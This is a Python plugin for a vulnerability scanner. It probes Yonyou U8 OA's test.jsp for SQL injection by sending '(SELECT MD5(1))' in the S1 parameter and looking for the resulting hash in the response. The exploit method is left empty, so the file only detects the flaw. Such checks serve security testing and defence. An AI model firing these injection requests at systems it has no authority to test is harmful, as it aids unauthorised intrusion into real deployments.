#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
用友U8 OA test.jsp SQL注入
    暂无编号
        Payload: https://blog.csdn.net/qq_41617034/article/details/124268004

由于与致远OA使用相同的文件, 于是存在同样的漏洞
'''

from PluginManager import Vuln_Scan

class Scan(Vuln_Scan):
    def __init__(self):
        self.payloads = [
            {'path': 'yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))'},
            {'path': 'test.jsp?doType=101&S1=(SELECT%20MD5(1))'},
        ]
    
    def POC(self, clients):
        client = clients.get('reqClient')
        
        vul_info = {
            'app_name': 'Yonyou-U8-OA',
            'vul_type': 'SQLinject',
            'vul_id': 'Yonyou-u8-test.jsp-sqlinject',
        }

        for payload in self.payloads:
            path = payload['path']

            res = client.request(
                'get',
                path,
                allow_redirects=False,
                vul_info=vul_info
            )
            if res is None:
                continue

            if ('c4ca4238a0b923820dcc509a6f75849b' in res.text):
                results = {
                    'Target': res.request.url,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        return None
    
    def EXP(self, clients):
        pass

    def Start(self, clients):
        return self.POC(clients)
